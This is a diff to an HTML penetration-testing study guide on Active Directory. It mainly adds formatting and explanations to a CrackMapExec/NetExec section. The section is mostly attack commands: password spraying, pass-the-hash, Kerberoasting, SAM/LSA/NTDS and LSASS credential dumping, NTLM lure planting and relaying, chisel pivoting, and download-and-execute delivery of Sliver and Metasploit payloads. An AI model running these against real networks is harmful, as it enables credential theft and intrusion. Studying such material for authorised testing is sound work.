@@ -135,6 +135,8 @@
 
 <p>AD is arranged in a hierarchical tree: <strong>forest</strong> &gt; <strong>domains</strong> &gt; <strong>OUs</strong> &gt; <strong>objects</strong>. The forest is the security boundary. A domain is a structure within which contained objects are accessible. <strong>Organizational Units (OUs)</strong> are containers for objects and sub-OUs that allow assignment of different Group Policy Objects.</p>
 
+<figure><img src="./img/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain hierarchical structure"></figure>
+
 <table class="custom-table">
   <thead><tr><th>Component</th><th>Description</th></tr></thead>
   <tbody>
@@ -1676,7 +1678,7 @@ xfreerdp /v:[target] /u:[user] /p:[password]</code></pre>
 
 <h3 id="cape-active-directory-bloodhound-a1b2c3">3.1 BloodHound Overview</h3>
 
-<p><strong>BloodHound</strong> is an open-source tool that uses graph theory to visualize relationships between Active Directory objects and identify attack paths that are difficult to detect through traditional enumeration. It was created by @_wald0, @harmj0y, and @CptJesus.</p>
+<p><strong>BloodHound</strong> is an open-source tool that uses graph theory to visualize relationships between Active Directory objects and identify attack paths that are difficult to detect through traditional enumeration.</p>
 
 <p>BloodHound stores data in <strong>Neo4j</strong>, a graph database that uses nodes (AD objects: users, groups, computers, etc.) and edges (relationships: MemberOf, AdminTo, etc.) to model the environment. Queries are written in <strong>Cypher Query Language</strong>, Neo4j's SQL-like graph query language.</p>
 
@@ -1822,6 +1824,8 @@ bloodhound</code></pre>
   <li><code>SharpHound.ps1</code> - PowerShell script (loads into memory; latest releases no longer ship this)</li>
   <li><code>AzureHound.ps1</code> - Azure data collection</li>
 </ul>
+
+<figure><img src="./img/cape/sharphound-collection-methods.png" alt="SharpHound collection methods reference showing LDAP queries, ports, and data types"></figure>
 
 <h4 id="cape-active-directory-bloodhound-666fff">3.3.1 Basic Enumeration</h4>
 
@@ -4016,7 +4020,7 @@ Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -or $_.Id -eq 462
 
 <p>CrackMapExec (CME) is a post-exploitation framework designed to assess and attack Active Directory environments at scale. It wraps a large number of attack techniques - from password spraying and Kerberoasting to credential dumping and lateral movement - behind a single, protocol-aware CLI. <strong>NetExec</strong> (<code>nxc</code>) is the community-maintained fork and direct successor; commands are interchangeable unless noted.</p>
 
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Protocol</th><th>Default Port</th><th>Key Use Cases</th></tr>
   </thead>
@@ -4036,7 +4040,7 @@ Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4624 -or $_.Id -eq 462
 
 <h4 id="5-1-1-poetry">5.1.1 Poetry (Recommended)</h4>
 <p>Poetry isolates the CME virtualenv and makes building custom modules straightforward.</p>
-<pre><code># Clone and install
+<pre><code class="language-bash"># Clone and install
 git clone https://github.com/Porchetta-Industries/CrackMapExec
 cd CrackMapExec
 poetry install
@@ -4046,21 +4050,24 @@ poetry run crackmapexec --help
 poetry shell</code></pre>
 
 <h4 id="5-1-2-pip-pipx">5.1.2 pip / pipx</h4>
-<pre><code>pip install crackmapexec
+<p>Standard Python package install. pipx is preferred as it creates an isolated virtual environment automatically.</p>
+<pre><code class="language-bash">pip install crackmapexec
 # or
 pipx install crackmapexec</code></pre>
 
 <h4 id="5-1-3-docker">5.1.3 Docker</h4>
-<pre><code>docker pull byt3bl33d3r/crackmapexec
+<p>Run CME in a container without installing Python dependencies on the host.</p>
+<pre><code class="language-bash">docker pull byt3bl33d3r/crackmapexec
 docker run -it --entrypoint=/bin/sh byt3bl33d3r/crackmapexec</code></pre>
 
 <h4 id="5-1-4-precompiled">5.1.4 Precompiled Binaries</h4>
 <p>GitHub Releases page ships standalone ELF binaries that require no Python environment.</p>
-<pre><code>wget https://github.com/Porchetta-Industries/CrackMapExec/releases/latest/download/cme-ubuntu-latest -O cme
+<pre><code class="language-bash">wget https://github.com/Porchetta-Industries/CrackMapExec/releases/latest/download/cme-ubuntu-latest -O cme
 chmod +x cme && sudo mv cme /usr/local/bin/crackmapexec</code></pre>
 
 <h4 id="5-1-5-netexec">5.1.5 NetExec (Maintained Fork)</h4>
-<pre><code># Install NetExec
+<p>NetExec (<code>nxc</code>) is the actively maintained successor to CrackMapExec. The CLI is identical; replace <code>crackmapexec</code> with <code>nxc</code> or <code>netexec</code>.</p>
+<pre><code class="language-bash"># Install NetExec
 pip install netexec
 # or
 pipx install netexec
@@ -4070,7 +4077,7 @@ nxc smb [target-ip] -u admin -p '[password]'</code></pre>
 
 <h4 id="5-1-6-config">5.1.6 Configuration File</h4>
 <p>CME stores its config at <code>~/.cme/cme.conf</code> and per-protocol databases under <code>~/.cme/workspaces/default/</code>.</p>
-<pre><code>cat ~/.cme/cme.conf
+<pre><code class="language-bash">cat ~/.cme/cme.conf
 # [CME]
 # workspace = default
 # last_used_db = smb
@@ -4079,7 +4086,7 @@ nxc smb [target-ip] -u admin -p '[password]'</code></pre>
 
 <h4 id="5-1-7-audit-mode">5.1.7 Audit Mode</h4>
 <p>Replaces passwords/hashes in terminal output with a masking character - useful when screenshotting for reports.</p>
-<pre><code># Edit cme.conf:
+<pre><code class="language-bash"># Edit cme.conf:
 # audit_mode = #
 
 # Output will show hashes/passwords as ########
@@ -4090,7 +4097,7 @@ crackmapexec smb [target-ip] -u robert -p [password].txt
 <h3 id="5-2-connection-output">5.2 Understanding Output</h3>
 
 <h4 id="5-2-1-status-colors">5.2.1 Account Status Indicators</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Color</th><th>Meaning</th></tr>
   </thead>
@@ -4101,20 +4108,16 @@ crackmapexec smb [target-ip] -u robert -p [password].txt
   </tbody>
 </table>
 
-<h4 id="5-2-2-protocol-banner">5.2.2 Protocol Banner Fields</h4>
-<pre><code>SMB   [target-ip]  445  [dc]  [*] Windows 10.0 Build 17763 x64
-      (name:[dc]) (domain:[domain]) (signing:True) (SMBv1:False)</code></pre>
-
-<h4 id="5-2-3-continue-success">5.2.3 Continue on Success</h4>
+<h4 id="5-2-2-continue-success">5.2.2 Continue on Success</h4>
 <p>By default CME stops on the first valid credential. Use <code>--continue-on-success</code> for password spraying when multiple accounts may share the same password.</p>
-<pre><code>crackmapexec smb [target-ip] -u users.txt -p '[password]' --continue-on-success</code></pre>
+<pre><code class="language-bash">crackmapexec smb [target-ip] -u users.txt -p '[password]' --continue-on-success</code></pre>
 
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-3-smb-enum">5.3 SMB Enumeration</h3>
 
 <h4 id="5-3-1-null-anon">5.3.1 NULL / Anonymous Sessions</h4>
 <p>SMB NULL sessions allow unauthenticated enumeration if the server permits them.</p>
-<pre><code># NULL session
+<pre><code class="language-bash"># NULL session
 crackmapexec smb [target-ip] -u "" -p ""
 
 # Anonymous session
@@ -4124,18 +4127,21 @@ crackmapexec smb [target-ip] -u "anonymous" -p ""
 crackmapexec smb [target-ip] -u "" -p "" --rid-brute</code></pre>
 
 <h4 id="5-3-2-host-info">5.3.2 Host &amp; Domain Information</h4>
-<pre><code># OS, hostname, signing, SMBv1 status
+<p>Any authenticated SMB connection returns the OS version, hostname, domain name, SMB signing status, and SMBv1 support in the banner. Signing status is critical for identifying relay targets.</p>
+<pre><code class="language-bash"># OS, hostname, signing, SMBv1 status
 crackmapexec smb [target-ip] -u grace -p '[password]'</code></pre>
 
 <h4 id="5-3-3-share-enum">5.3.3 Share Enumeration</h4>
-<pre><code># List shares and permissions
+<p>List all SMB shares with read/write permissions. The <code>--gen-relay-list</code> flag identifies hosts without SMB signing, which are valid targets for NTLM relay attacks.</p>
+<pre><code class="language-bash"># List shares and permissions
 crackmapexec smb [target-ip] -u grace -p '[password]' --shares
 
 # Generate a list of hosts without SMB signing (relay candidates)
 crackmapexec smb [target-ip]/24 --gen-relay-list relay_targets.txt</code></pre>
 
 <h4 id="5-3-4-spidering">5.3.4 Share Spidering</h4>
-<pre><code># Spider a specific share with a pattern filter
+<p>Recursively search share contents for files matching a pattern or regex. The <code>spider_plus</code> module provides comprehensive spidering with JSON output and optional file download. Use <code>--content</code> to search inside file contents (slow on large shares).</p>
+<pre><code class="language-bash"># Spider a specific share with a pattern filter
 crackmapexec smb [target-ip] -u grace -p '[password]' --spider IT \
   --pattern password
 
@@ -4154,7 +4160,8 @@ crackmapexec smb [target-ip] -u grace -p '[password]' \
   -M spider_plus -o DOWNLOAD_FLAG=True</code></pre>
 
 <h4 id="5-3-5-users-sessions">5.3.5 User &amp; Session Enumeration</h4>
-<pre><code># Logged-on users
+<p>Enumerate logged-on users, active sessions, domain computers, groups, and local groups. RID brute-forcing enumerates users by cycling through SID RIDs, which works even when standard user enumeration is restricted.</p>
+<pre><code class="language-bash"># Logged-on users
 crackmapexec smb [target-ip] -u grace -p '[password]' --loggedon-users
 
 # Active sessions
@@ -4178,14 +4185,16 @@ crackmapexec smb [target-ip] -u grace -p '[password]' \
   --wmi "SELECT * FROM Win32_ComputerSystem"</code></pre>
 
 <h4 id="5-3-6-laps">5.3.6 LAPS Password Retrieval</h4>
-<pre><code># Read LAPS managed local admin password
+<p>LAPS (Local Administrator Password Solution) stores unique local admin passwords in AD attributes. If the authenticated user has read permissions on the LAPS attributes, CME retrieves the cleartext password.</p>
+<pre><code class="language-bash"># Read LAPS managed local admin password
 crackmapexec smb [target-ip] -u grace -p '[password]' --laps</code></pre>
 
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-4-ldap-enum">5.4 LDAP Enumeration</h3>
 
 <h4 id="5-4-1-ldap-basics">5.4.1 Basic LDAP Queries</h4>
-<pre><code># Get domain SID
+<p>CME's LDAP protocol supports direct AD enumeration for delegation settings, protected accounts, GMSA passwords, and password policy flags. These queries run against the LDAP service on port 389/636.</p>
+<pre><code class="language-bash"># Get domain SID
 crackmapexec ldap [target-ip] -u grace -p '[password]' --get-sid
 
 # Accounts with "password not required" flag
@@ -4204,7 +4213,8 @@ crackmapexec ldap [target-ip] -u grace -p '[password]' \
 crackmapexec ldap [target-ip] -u grace -p '[password]' --gmsa</code></pre>
 
 <h4 id="5-4-2-ldap-modules">5.4.2 Useful LDAP Modules</h4>
-<pre><code># Enumerate AD subnets
+<p>LDAP modules extend enumeration beyond basic queries. Key modules include subnet discovery, DNS zone dumping, machine account quota checks, DACL reads, user description harvesting, group membership enumeration, LDAP signing status, and AD CS misconfiguration detection.</p>
+<pre><code class="language-bash"># Enumerate AD subnets
 crackmapexec ldap [target-ip] -u grace -p '[password]' -M subnets
 
 # Dump domain DNS zones
@@ -4248,18 +4258,16 @@ crackmapexec ldap [target-ip] -u grace -p '[password]' \
 <h4 id="5-5-1-password-spray">5.5.1 Password Spraying</h4>
 <p>Spraying tests one or a few passwords against many accounts to avoid account lockout. Always check the lockout policy before spraying.</p>
 
-<div class="methodology-block">
-  <h5>Methodology: Password Spray with CME</h5>
-  <ul>
-    <li><input type="checkbox" data-id="cape-5-M-1"> Determine password policy (lockout threshold, observation window)</li>
-    <li><input type="checkbox" data-id="cape-5-M-2"> Collect valid usernames (RID brute, LDAP, Kerbrute)</li>
-    <li><input type="checkbox" data-id="cape-5-M-3"> Spray one password at a time, leaving observation window between attempts</li>
-    <li><input type="checkbox" data-id="cape-5-M-4"> Use <code>--continue-on-success</code> to collect all valid creds</li>
-    <li><input type="checkbox" data-id="cape-5-M-5"> Spray against multiple protocols (SMB, WinRM, LDAP, MSSQL)</li>
-  </ul>
-</div>
+<h4 id="5-5-1-methodology">Methodology</h4>
+<ul class="methodology-checklist">
+  <li><input type="checkbox" data-id="cape-5-5-0"> Determine password policy (lockout threshold, observation window)</li>
+  <li><input type="checkbox" data-id="cape-5-5-1"> Collect valid usernames (RID brute, LDAP, Kerbrute)</li>
+  <li><input type="checkbox" data-id="cape-5-5-2"> Spray one password at a time, leaving observation window between attempts</li>
+  <li><input type="checkbox" data-id="cape-5-5-3"> Use <code>--continue-on-success</code> to collect all valid creds</li>
+  <li><input type="checkbox" data-id="cape-5-5-4"> Spray against multiple protocols (SMB, WinRM, LDAP, MSSQL)</li>
+</ul>
 
-<pre><code># Spray against SMB
+<pre><code class="language-bash"># Spray against SMB
 crackmapexec smb [target-ip] -u users.txt -p '[password]' \
   --continue-on-success
 
@@ -4279,7 +4287,8 @@ crackmapexec mssql [target-ip] -u users.txt -p '[password]' \
 crackmapexec smb [target-ip] -u users.txt -p "password"</code></pre>
 
 <h4 id="5-5-2-local-auth">5.5.2 Local Authentication</h4>
-<pre><code># Authenticate as a local account (not domain account)
+<p>The <code>--local-auth</code> flag authenticates against the SAM database rather than the domain. This is useful for testing reused local admin passwords across a subnet.</p>
+<pre><code class="language-bash"># Authenticate as a local account (not domain account)
 crackmapexec smb [target-ip] -u Administrator -p '[password]' --local-auth
 
 # Local auth spray across a subnet
@@ -4288,7 +4297,7 @@ crackmapexec smb [target-ip]/24 -u Administrator -p '[password]' --local-auth \
 
 <h4 id="5-5-3-pth">5.5.3 Pass-the-Hash (PtH)</h4>
 <p>CME accepts NT hashes directly with the <code>-H</code> flag.</p>
-<pre><code>crackmapexec smb [target-ip] -u Administrator \
+<pre><code class="language-bash">crackmapexec smb [target-ip] -u Administrator \
   -H aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901973d9a344
 
 # PtH with local auth
@@ -4299,7 +4308,7 @@ crackmapexec smb [target-ip] -u Administrator \
 <h4 id="5-5-4-uac-bypass">5.5.4 UAC &amp; LocalAccountTokenFilterPolicy</h4>
 <p>Windows UAC remote restrictions block PtH for non-RID-500 local accounts unless <code>LocalAccountTokenFilterPolicy</code> is set to 1. Domain accounts in the Administrators group are unaffected.</p>
 
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Account Type</th><th>Default UAC Behavior</th><th>Fix</th></tr>
   </thead>
@@ -4315,7 +4324,7 @@ crackmapexec smb [target-ip] -u Administrator \
 
 <h4 id="5-6-1-asreproast">5.6.1 ASREPRoasting</h4>
 <p>Targets accounts that have Kerberos pre-authentication disabled. CME uses the LDAP protocol and the <code>--asreproast</code> flag.</p>
-<pre><code># Find and dump AS-REP hashes
+<pre><code class="language-bash"># Find and dump AS-REP hashes
 crackmapexec ldap [target-ip] -u grace -p '[password]' \
   --asreproast asrep_hashes.txt
 
@@ -4324,7 +4333,7 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
 <h4 id="5-6-2-kerberoast">5.6.2 Kerberoasting</h4>
 <p>Requests service tickets for all accounts with SPNs and extracts the encrypted portion for offline cracking.</p>
-<pre><code># Dump Kerberoastable hashes via LDAP protocol
+<pre><code class="language-bash"># Dump Kerberoastable hashes via LDAP protocol
 crackmapexec ldap [target-ip] -u grace -p '[password]' \
   --kerberoasting kerberoast_hashes.txt
 
@@ -4333,7 +4342,7 @@ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt</code></
 
 <h4 id="5-6-3-kerb-auth">5.6.3 Kerberos Authentication in CME</h4>
 <p>From CME 5.4.0 onward, Kerberos authentication works without exporting <code>KRB5CCNAME</code> when using username + password. FQDN must be in <code>/etc/hosts</code>.</p>
-<pre><code># Add DC FQDN to /etc/hosts
+<pre><code class="language-bash"># Add DC FQDN to /etc/hosts
 echo "[target-ip] [dc].[domain] [dc] [domain] [domain]" \
   | sudo tee -a /etc/hosts
 
@@ -4353,7 +4362,8 @@ crackmapexec smb [target-ip] -u julio \
   --aesKey 77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76</code></pre>
 
 <h4 id="5-6-4-ccache">5.6.4 CCache File Authentication</h4>
-<pre><code># Generate TGT with getTGT.py
+<p>Use a cached Kerberos ticket (ccache) for authentication instead of plaintext credentials. Generate the TGT with Impacket's <code>getTGT.py</code>, export the <code>KRB5CCNAME</code> variable, and pass <code>--use-kcache</code> to CME. MSSQL requires the DC FQDN rather than the IP address.</p>
+<pre><code class="language-bash"># Generate TGT with getTGT.py
 getTGT.py [domain]/[user]:'[password]' -dc-ip [target-ip]
 # Saving ticket in robert.ccache
 
@@ -4376,7 +4386,7 @@ crackmapexec smb [target-ip] --use-kcache --shares</code></pre>
 <h3 id="5-7-command-execution">5.7 Command Execution</h3>
 
 <h4 id="5-7-1-exec-methods">5.7.1 Execution Methods</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Method</th><th>Flag</th><th>Description</th></tr>
   </thead>
@@ -4389,7 +4399,8 @@ crackmapexec smb [target-ip] --use-kcache --shares</code></pre>
 </table>
 
 <h4 id="5-7-2-run-cmd">5.7.2 Running Commands</h4>
-<pre><code># CMD command
+<p>Use <code>-x</code> for CMD commands and <code>-X</code> for PowerShell. The <code>--force-ps32</code> flag forces 32-bit PowerShell (useful when 64-bit is blocked). Use <code>--amsi-bypass</code> to load an AMSI bypass script before execution, and <code>--no-output</code> for fire-and-forget payloads that would otherwise hang waiting for output.</p>
+<pre><code class="language-bash"># CMD command
 crackmapexec smb [target-ip] -u julio -p '[password]' -x whoami
 
 # PowerShell command
@@ -4416,37 +4427,41 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
   --no-output</code></pre>
 
 <h4 id="5-7-3-winrm-exec">5.7.3 WinRM Execution</h4>
-<pre><code>crackmapexec winrm [target-ip] -u julio -p '[password]' -x whoami
+<p>WinRM execution requires the target user to be a member of the Remote Management Users group (or local Administrators). Same <code>-x</code> and <code>-X</code> flags apply.</p>
+<pre><code class="language-bash">crackmapexec winrm [target-ip] -u julio -p '[password]' -x whoami
 crackmapexec winrm [target-ip] -u julio -p '[password]' -X 'Get-Process'</code></pre>
 
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-8-credential-dumping">5.8 Credential Dumping</h3>
 
 <h4 id="5-8-1-sam">5.8.1 SAM Dump</h4>
-<pre><code># Dump local SAM database (local accounts + NTLM hashes)
+<p>Dumps the local Security Account Manager database, revealing local account NTLM hashes. Requires local admin privileges on the target.</p>
+<pre><code class="language-bash"># Dump local SAM database (local accounts + NTLM hashes)
 crackmapexec smb [target-ip] -u julio -p '[password]' --sam</code></pre>
 
 <h4 id="5-8-2-lsa">5.8.2 LSA Secrets</h4>
-<pre><code># Dump LSA secrets (cached domain credentials, service account creds)
+<p>LSA secrets contain cached domain credentials, service account passwords, and machine account keys. This often yields domain credentials that are not in the SAM.</p>
+<pre><code class="language-bash"># Dump LSA secrets (cached domain credentials, service account creds)
 crackmapexec smb [target-ip] -u julio -p '[password]' --lsa</code></pre>
 
 <h4 id="5-8-3-ntds">5.8.3 NTDS.dit Dump</h4>
-<pre><code># Dump all domain hashes via VSS shadow copy
+<p>Dumps the NTDS.dit Active Directory database from a Domain Controller via VSS shadow copy. This extracts NTLM hashes for every domain account. Requires Domain Admin or DC machine account access.</p>
+<pre><code class="language-bash"># Dump all domain hashes via VSS shadow copy
 crackmapexec smb [target-ip] -u julio -p '[password]' --ntds
 
 # After ZeroLogon exploit - dump with empty machine account password
 crackmapexec smb [target-ip] -u '[dc]$' -p '' --ntds</code></pre>
 
 <p>Hashes are saved to <code>~/.cme/logs/</code>. To extract only enabled accounts:</p>
-<pre><code>cat ~/.cme/logs/DC01_[target-ip]_2022-12-09_065546.ntds \
+<pre><code class="language-bash">cat ~/.cme/logs/DC01_[target-ip]_2022-12-09_065546.ntds \
   | grep -iv disabled | cut -d ':' -f1</code></pre>
 
 <h4 id="5-8-4-dcc2">5.8.4 Cached Credentials (DCC2)</h4>
 <p>LSA dump may return DCC2 hashes (<code>$DCC2$10240#user#hash</code>). These are slow to crack (hashcat mode 2100).</p>
-<pre><code>hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+<pre><code class="language-bash">hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
 
 <h4 id="5-8-5-lsass-modules">5.8.5 LSASS Dump Modules</h4>
-<table>
+<table class="custom-table">
   <thead>
     <tr><th>Module</th><th>Description</th></tr>
   </thead>
@@ -4458,7 +4473,7 @@ crackmapexec smb [target-ip] -u '[dc]$' -p '' --ntds</code></pre>
   </tbody>
 </table>
 
-<pre><code># lsassy
+<pre><code class="language-bash"># lsassy
 crackmapexec smb [target-ip] -u julio -p '[password]' -M lsassy
 
 # procdump
@@ -4474,7 +4489,8 @@ crackmapexec smb [target-ip] -u julio -p '[password]' -M nanodump</code></pre>
 <h3 id="5-9-mssql">5.9 MSSQL Attacks</h3>
 
 <h4 id="5-9-1-mssql-auth">5.9.1 Authentication &amp; Enumeration</h4>
-<pre><code># Auth with domain user
+<p>CME connects to MSSQL on port 1433 with domain or SQL Server credentials. Use <code>--local-auth</code> for SQL Server accounts (sa, etc.) and <code>-q</code> to run arbitrary SQL queries.</p>
+<pre><code class="language-bash"># Auth with domain user
 crackmapexec mssql [target-ip] -u julio -p '[password]' -d [domain]
 
 # Auth with SQL Server account (local auth)
@@ -4485,7 +4501,8 @@ crackmapexec mssql [target-ip] -u julio -p '[password]' \
   -q 'SELECT name FROM sys.databases'</code></pre>
 
 <h4 id="5-9-2-xp-cmdshell">5.9.2 xp_cmdshell Execution</h4>
-<pre><code># Execute OS command via xp_cmdshell
+<p>If the SQL user has sysadmin privileges, CME automatically enables <code>xp_cmdshell</code> and executes OS commands. The <code>-x</code> and <code>-X</code> flags work the same as with SMB.</p>
+<pre><code class="language-bash"># Execute OS command via xp_cmdshell
 crackmapexec mssql [target-ip] -u julio -p '[password]' -x whoami
 
 # PowerShell via xp_cmdshell
@@ -4493,7 +4510,8 @@ crackmapexec mssql [target-ip] -u julio -p '[password]' \
   -X 'Get-LocalUser'</code></pre>
 
 <h4 id="5-9-3-file-transfer">5.9.3 File Transfer</h4>
-<pre><code># Upload file to target
+<p>Upload and download files to/from targets through the MSSQL connection. Files are transferred using OLE Automation procedures.</p>
+<pre><code class="language-bash"># Upload file to target
 crackmapexec mssql [target-ip] -u julio -p '[password]' \
   --put-file /tmp/payload.exe 'C:\Windows\Temp\payload.exe'
 
@@ -4502,7 +4520,8 @@ crackmapexec mssql [target-ip] -u julio -p '[password]' \
   --get-file 'C:\Windows\Temp\flag.txt' /tmp/flag.txt</code></pre>
 
 <h4 id="5-9-4-mssql-priv">5.9.4 MSSQL Privilege Escalation</h4>
-<pre><code># Check current privileges and auto-escalate if possible
+<p>The <code>mssql_priv</code> module checks for impersonation privileges and linked server chains that can escalate a low-privilege SQL user to sysadmin.</p>
+<pre><code class="language-bash"># Check current privileges and auto-escalate if possible
 crackmapexec mssql [target-ip] -u julio -p '[password]' -M mssql_priv
 
 # Options: check, privesc
@@ -4515,11 +4534,13 @@ crackmapexec mssql [target-ip] -u julio -p '[password]' \
 <p>Group Policy Preferences (GPP) historically stored credentials in SYSVOL XML files, encrypted with a publicly disclosed AES key (MS14-025).</p>
 
 <h4 id="5-10-1-gpp-password">5.10.1 gpp_password Module</h4>
-<pre><code># Find plaintext passwords from GPP (Groups.xml, etc.)
+<p>Searches SYSVOL for Group Policy Preferences XML files (Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml) and decrypts embedded credentials using the publicly known AES key.</p>
+<pre><code class="language-bash"># Find plaintext passwords from GPP (Groups.xml, etc.)
 crackmapexec smb [target-ip] -u grace -p '[password]' -M gpp_password</code></pre>
 
 <h4 id="5-10-2-gpp-autologin">5.10.2 gpp_autologin Module</h4>
-<pre><code># Find autologon credentials from Registry.xml
+<p>Extracts autologon credentials stored in GPP Registry.xml files. These credentials configure automatic login on domain machines and are often overlooked during remediation.</p>
+<pre><code class="language-bash"># Find autologon credentials from Registry.xml
 crackmapexec smb [target-ip] -u grace -p '[password]' -M gpp_autologin</code></pre>
 
 <!-- ---------------------------------------------------------- -->
@@ -4528,7 +4549,7 @@ crackmapexec smb [target-ip] -u grace -p '[password]' -M gpp_autologin</code></p
 <p>These modules plant UNC-path lures in writable shares. When a user or system accesses the planted file, it triggers an NTLM authentication attempt back to the attacker's machine.</p>
 
 <h4 id="5-11-1-slinky">5.11.1 Slinky Module (LNK Files)</h4>
-<pre><code># Plant LNK shortcut with UNC icon path in all writable shares
+<pre><code class="language-bash"># Plant LNK shortcut with UNC icon path in all writable shares
 crackmapexec smb [target-ip] -u grace -p '[password]' \
   -M slinky -o NAME=test SERVER=[target-ip]
 
@@ -4537,13 +4558,13 @@ netexec smb 192.168.92.128 -d motasem.local -u admin -p [password] \
   -M slinky -o NAME=test SERVER=192.168.92.129</code></pre>
 
 <h4 id="5-11-2-drop-sc">5.11.2 drop-sc Module (.searchConnector-ms)</h4>
-<pre><code># Drop .searchConnector-ms file (triggers SMB auth on open)
+<pre><code class="language-bash"># Drop .searchConnector-ms file (triggers SMB auth on open)
 crackmapexec smb [target-ip] -u grace -p '[password]' \
   -M drop-sc -o URL=\\\\[target-ip]\\test</code></pre>
 
 <h4 id="5-11-3-relay">5.11.3 NTLM Relay Setup</h4>
 <p>After deploying Slinky or drop-sc, use ntlmrelayx to capture and relay hashes to targets without SMB signing.</p>
-<pre><code># Capture hashes with Responder (passive mode, no poisoning)
+<pre><code class="language-bash"># Capture hashes with Responder (passive mode, no poisoning)
 sudo responder -I eth0 -A
 
 # Relay to targets without SMB signing
@@ -4556,7 +4577,8 @@ sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -i</code></pre>
 <h3 id="5-12-rdp">5.12 RDP Enumeration &amp; Control</h3>
 
 <h4 id="5-12-1-rdp-enum">5.12.1 RDP Enumeration</h4>
-<pre><code># Screenshot (requires valid creds with RDP access)
+<p>Capture screenshots of active RDP sessions. The <code>--nla-screenshot</code> flag handles NLA-protected connections. Screenshots are saved to <code>~/.cme/screenshots/</code>.</p>
+<pre><code class="language-bash"># Screenshot (requires valid creds with RDP access)
 crackmapexec rdp [target-ip] -u julio -p '[password]' --screenshot
 
 # NLA-protected screenshot
@@ -4571,7 +4593,8 @@ crackmapexec rdp [target-ip] -u julio -p '[password]' \
   --screenshot --res 1280x720</code></pre>
 
 <h4 id="5-12-2-rdp-module">5.12.2 Enable / Disable RDP</h4>
-<pre><code># Check module options
+<p>Remotely enable or disable RDP on a target by modifying the <code>fDenyTSConnections</code> registry value. Requires admin access over SMB.</p>
+<pre><code class="language-bash"># Check module options
 crackmapexec smb [target-ip] -u julio -p '[password]' -M rdp --options
 # [*] rdp module options:
 #     ACTION  Enable/Disable RDP (choices: enable, disable)
@@ -4587,7 +4610,7 @@ crackmapexec smb [target-ip] -u julio -p '[password]' -M rdp -o ACTION=disable</
 
 <h4 id="5-13-1-bh-config">5.13.1 BloodHound Configuration</h4>
 <p>Enable BloodHound integration in <code>~/.cme/cme.conf</code> to auto-populate the graph when credentials are found.</p>
-<pre><code># In cme.conf
+<pre><code class="language-bash"># In cme.conf
 # [BloodHound]
 # bh_enabled = True
 # bh_uri = 127.0.0.1
@@ -4596,19 +4619,19 @@ crackmapexec smb [target-ip] -u julio -p '[password]' -M rdp -o ACTION=disable</
 # bh_pass = neo4j</code></pre>
 
 <h4 id="5-13-2-bh-collection">5.13.2 SharpHound Collection via CME</h4>
-<pre><code># Run SharpHound via CME (uploads, runs, retrieves ZIP)
+<pre><code class="language-bash"># Run SharpHound via CME (uploads, runs, retrieves ZIP)
 crackmapexec smb [target-ip] -u julio -p '[password]' \
   -M bloodhound -o COLLECTION_METHOD=All</code></pre>
 
 <h4 id="5-13-3-bh-owned">5.13.3 Marking Nodes as Owned</h4>
-<pre><code># Mark a computer as owned in BloodHound DB
+<pre><code class="language-bash"># Mark a computer as owned in BloodHound DB
 crackmapexec smb [target-ip] -u julio -p '[password]' -M bh_owned</code></pre>
 
 <!-- ---------------------------------------------------------- -->
 <h3 id="5-14-pivoting">5.14 Pivoting with Proxychains &amp; Chisel</h3>
 
 <h4 id="5-14-1-chisel-setup">5.14.1 Chisel Tunnel Setup</h4>
-<pre><code># Upload Chisel to compromised host
+<pre><code class="language-bash"># Upload Chisel to compromised host
 crackmapexec smb [target-ip] -u Administrator -p '[password]$$' \
   --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth
 
@@ -4620,7 +4643,7 @@ crackmapexec smb [target-ip] -u Administrator -p '[password]$$' \
   -x "C:\Windows\Temp\chisel.exe client [target-ip]:8080 R:socks" --local-auth</code></pre>
 
 <h4 id="5-14-2-proxychains-cme">5.14.2 Using Proxychains with CME</h4>
-<pre><code># Add SOCKS proxy to /etc/proxychains.conf
+<pre><code class="language-bash"># Add SOCKS proxy to /etc/proxychains.conf
 # socks5 127.0.0.1 1080
 
 # Run CME through the tunnel
@@ -4632,7 +4655,7 @@ proxychains4 -q crackmapexec smb [target-ip] -u [user] \
 
 <h4 id="5-15-1-sliver-delivery">5.15.1 Sliver C2 Payload via CME</h4>
 <p>Use CME to deliver Sliver implants across multiple hosts. Generate the implant separately and serve it over HTTP, then use CME to trigger download-and-execute.</p>
-<pre><code># Generate Sliver implant (on Sliver server)
+<pre><code class="language-bash"># Generate Sliver implant (on Sliver server)
 # sliver> generate --mtls [target-ip] --os windows --arch amd64 \
 #           --format exe --save /tmp/implant.exe
 
@@ -4651,7 +4674,7 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
   -x 'C:\Windows\Temp\svc.exe'</code></pre>
 
 <h4 id="5-15-2-web-delivery">5.15.2 web_delivery Module</h4>
-<pre><code># Trigger a Metasploit web_delivery payload (if MSF handler is running)
+<pre><code class="language-bash"># Trigger a Metasploit web_delivery payload (if MSF handler is running)
 crackmapexec smb [target-ip] -u julio -p '[password]' \
   -M web_delivery -o URL=http://[target-ip]:8080/msfpayload</code></pre>
 
@@ -4659,12 +4682,13 @@ crackmapexec smb [target-ip] -u julio -p '[password]' \
 <h3 id="5-16-keepass">5.16 KeePass Attacks</h3>
 
 <h4 id="5-16-1-keepass-discover">5.16.1 keepass_discover Module</h4>
-<pre><code># Find KeePass-related files and running processes
